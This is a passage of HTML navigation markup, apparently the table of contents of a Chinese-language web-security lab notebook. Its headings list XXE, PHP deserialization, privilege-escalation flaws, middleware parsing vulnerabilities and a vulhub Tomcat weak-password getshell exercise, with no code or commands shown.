href="#%E5%BB%B6%E7%94%B3-1"><span class="toc-text">延申</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-1"><span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-1"><span class="toc-text">方法二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#play-xxe%EF%BC%88%E9%9D%B6%E6%9C%BA%E4%BA%8C%EF%BC%89"><span class="toc-text">play_xxe（靶机二）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-1"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C-1"><span class="toc-text">操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-2"><span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-2"><span class="toc-text">方法二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe%EF%BC%88%E9%9D%B6%E5%9C%BA%E4%B8%89%EF%BC%89"><span class="toc-text">xxe（靶场三）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">php反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-text">越权漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-text">垂直越权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#catfish%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-text">catfish垂直越权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-2"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C-2"><span class="toc-text">操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="toc-text">水平越权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#yxcms%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="toc-text">yxcms水平越权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-3"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C-3"><span class="toc-text">操作</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-text">中间件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS"><span class="toc-text">IIS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS6-0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-text">IIS6.0解析漏洞：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS7-5%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-text">IIS7.5解析漏洞：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache"><span class="toc-text">Apache</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">apache解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C-4"><span class="toc-text">操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx"><span class="toc-text">Nginx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat"><span class="toc-text">Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94Tomcat7-%E5%BC%B1%E5%AF%86%E7%A0%81-amp-amp-%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E"><span class="toc-text">vulhub漏洞复现——Tomcat7+弱密码&amp;&amp;后端Getshell漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%90%AF%E5%8A%A8"><span class="toc-text">环境启动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0Getshell"><span class="toc-text">后台Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%86%E5%A4%87jsp%E6%9C%A8%E9%A9%AC"><span class="toc-text">准备jsp木马</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%B6%E4%BD%9Cwar%E5%8C%85"><span class="toc-text">制作war包</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2war%E5%8C%85%E5%88%B0Tomcat-Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AE%A1%E7%90%86%E8%80%85"><span class="toc-text">部署war包到Tomcat Web应用程序管理者</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
     </div>
   </div>
 
